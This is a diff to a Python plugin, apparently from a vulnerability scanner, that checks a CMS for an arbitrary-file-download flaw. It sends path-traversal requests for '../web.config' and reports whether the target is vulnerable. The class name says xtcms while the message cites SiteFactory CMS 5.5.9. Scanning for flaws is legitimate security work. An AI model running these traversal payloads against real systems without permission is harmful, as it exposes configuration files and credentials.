@@ -22,14 +22,18 @@ class xtcms_download_filedownload_BaseVerify:
         payloads = ["/manage/download.aspx?File=../web.config",
                     "/web/manage/download.aspx?File=../web.config"]
         try:
+            noexist = True
             for payload in payloads:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if req.headers["Content-Type"] == "application/xml":
                     cprint("[+]存在SiteFactory CMS 5.5.9任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在xtcms_download_filedownload漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
